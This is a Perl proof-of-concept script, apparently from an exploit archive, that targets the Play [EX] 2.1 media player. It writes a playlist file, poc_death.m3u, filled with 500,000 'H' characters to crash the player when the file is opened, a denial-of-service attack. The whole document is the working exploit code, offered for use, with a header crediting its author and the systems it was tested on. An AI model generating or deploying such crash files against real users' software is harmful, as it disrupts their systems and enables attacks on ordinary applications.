#!/usr/bin/perl
#
# Play [EX] 2.1 Playlist File (M3U/PLS/LST) DoS Exploit
# Exploit discovered and coded by Death Shadow Dark
# Tested on Windows 7 Pro 64 bit and Windows XP SP3 Pro
# Sofware Link http://www.nautrup.com/pex/PlayEX_Player.html
# death.shadow.dark@gmail.com
# 07/04/2012
#
 
$poc = "H" x 500000;
open(m3u, ">poc_death.m3u");
print m3u "$poc";
print "\n + Exploit created !\n";